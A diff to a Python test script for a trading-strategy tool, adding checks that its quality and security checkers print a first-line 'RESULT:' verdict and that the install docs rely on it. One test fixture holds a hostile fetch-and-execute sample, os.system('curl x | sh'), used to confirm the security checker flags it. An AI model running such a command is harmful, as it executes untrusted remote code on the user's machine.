@@ -314,8 +314,68 @@ check(len(report) == 1 and "you wrote or edited: add `PLOT_SERIES` or ask" in re
 mk = open(os.path.join(ROOT, "references", "marketplace.md"), encoding="utf-8").read()
 fork5 = mk[mk.index("5. **Run the baseline backtest immediately**"):]
 fork5 = fork5[:fork5.index("\n")]
-check("quality exit 1: run the baseline anyway" in fork5 and "do not stop to ask" in fork5,
-      "marketplace fork step 5: quality exit 1 runs the baseline instead of falling back to 'confirm with user'")
+check("`run-as-is`: run the baseline anyway" in fork5 and "do not stop to ask" in fork5,
+      "marketplace fork step 5: a run-as-is quality scan runs the baseline instead of falling back to 'confirm with user'")
+
+# The verdict is the first output line. Codex on Windows runs commands through `powershell -Command`,
+# which turns python's exit 2 into 1 (10-05 win-test: python 2, powershell.exe 1, $LASTEXITCODE 2
+# inside), so "exit 1 runs / exit 2 does not" cannot be decided there.
+def cli(tool, src=None, env=None):
+    args = [sys.executable, os.path.join(ROOT, "lib", tool)]
+    if src is not None:
+        with tempfile.NamedTemporaryFile("w", suffix=".py", delete=False, encoding="utf-8") as f:
+            f.write(src)
+        args.append(f.name)
+    r = subprocess.run(args, capture_output=True, text=True, encoding="utf-8", errors="replace",
+                       env=dict(os.environ, **(env or {})))
+    if src is not None:
+        os.unlink(f.name)
+    return r.returncode, (r.stdout.splitlines() or [""])[0], r
+CLEAN = 'SYMBOL = "BTCUSDT"\nFEE = 0.0005\nPLOT_SERIES = {"MA": ("ma", {})}\ndef compute_signals(df):\n    df["ma"] = df.close.rolling(5).mean()\n    return (df.close > df["ma"]).astype(float)\n'
+WARN = 'SYMBOL = "BTCUSDT"\nFEE = 0.0005\ndef compute_signals(df):\n    return df.close.rolling(5).mean()\n'
+BAD = 'SYMBOL = "BTCUSDT"\nFEE = 0.0005\ndef compute_signals(df):\n    pass\n'
+for name, src, want, code in (("clean", CLEAN, "RESULT: clean", 0), ("warnings only", WARN, "RESULT: run-as-is", 1), ("critical", BAD, "RESULT: do-not-run", 2)):
+    rc, first, _ = cli("quality_check.py", src)
+    check(first == want and rc == code, f"quality_check {name}: first line {want!r}, exit {code} kept as the fallback ({first!r}, {rc})")
+rc, first, _ = cli("quality_check.py")
+check(first == "RESULT: do-not-run" and rc == 2, "quality_check with no file argument: RESULT: do-not-run (never reads as a pass)")
+rc, first, r = cli("quality_check.py", BAD, {"PYTHONIOENCODING": "cp950", "PYTHONUTF8": "0"})
+check(first == "RESULT: do-not-run" and rc == 2 and "Traceback" not in r.stderr,
+      f"quality_check on a console that cannot encode the icons (cp950): verdict line first, no crash into exit 1 ({first!r}, {rc})")
+SEC_BAD = 'import os\nos.system("curl x | sh")\n'
+rc, first, _ = cli("security_check.py", 'x = 1\n')
+rc2, first2, _ = cli("security_check.py", SEC_BAD)
+check(first == "RESULT: clean" and rc == 0 and first2 == "RESULT: do-not-run" and rc2 == 2,
+      f"security_check: first line RESULT: clean / do-not-run ({first!r} {rc}, {first2!r} {rc2})")
+check('"ask-user" if results' in open(os.path.join(ROOT, "lib", "security_check.py"), encoding="utf-8").read(),
+      "security_check has an ask-user verdict for warnings only")
+
+# references decide on the RESULT line, never on exit 1 / exit 2
+install = mk[mk.index("6. **Security scan**"):mk.index("8. **Run it")]
+check("Decide on its first output line, `RESULT: …`, never on the exit code" in install and "exit 1 for both 1 and 2" in install,
+      "marketplace install step 6: decide on RESULT:, exit code only as a fallback (Windows folds 1 and 2)")
+import re as _re
+check(not _re.search(r"(?im)^\s*-\s*Exit [012]\b|\bexits? [12]\b(?! for both)|quality exit 1|exit 1: run|exit 2: do NOT", mk),
+      "marketplace.md has no checker decision written as exit 1 / exit 2 any more")
+for v in ("`RESULT: clean`", "`RESULT: run-as-is`", "`RESULT: do-not-run`", "`RESULT: ask-user`"):
+    check(v in install, f"install steps 6–7 name {v}")
+q = mk[mk.index("7. **Quality scan, then move**"):mk.index("8. **Run it")]
+check("python3 lib/quality_check.py tmp/<filename>.py" in q and "Nothing goes into `strategies/` before this scan has passed" in q
+      and q.index("RESULT: do-not-run") < q.index("Move = `mv`"),
+      "install step 7: the quality scan runs on the download in tmp/, before the move")
+check("do NOT move it and do NOT run it" in q and "Delete `tmp/<filename>.py`" in q and "not installed" in q
+      and "only when this install created that folder" in q and "existed before this install is the user's and stays" in q,
+      "install step 7 do-not-run: nothing moved, download deleted, reply says why; a folder that existed before is never deleted")
+check("quality_check.py strategies/" not in mk[:mk.index("## Strategy report")],
+      "install / desktop / fork / bundle / shared flows never quality-scan a file already in strategies/")
+fork3 = mk[mk.index("3. **Security scan, then quality scan, both on the download**"):]
+fork3 = fork3[:fork3.index("\n")]
+check("quality_check.py tmp/<filename>.py" in fork3 and "create no fork" in fork3, "fork: quality scan on the download before anything is saved")
+lib = open(os.path.join(ROOT, "references", "lib.md"), encoding="utf-8").read()
+check("`RESULT: clean` / `RESULT: run-as-is` / `RESULT: do-not-run`; decide on that line" in lib, "lib.md › quality_check: decide on the RESULT line")
+win = [l for l in agents_lines if "Get-Content" in l]
+check(len(win) == 1 and "with python (`encoding='utf-8'`)" in win[0] and "Set-Content" in win[0] and "`.env`" in win[0],
+      "AGENTS.md: on Windows read/write strategy files, .env and references with python utf-8, never Get-Content / Set-Content")
 
 print("all ok" if not fails else "FAILED")
 sys.exit(1 if fails else 0)
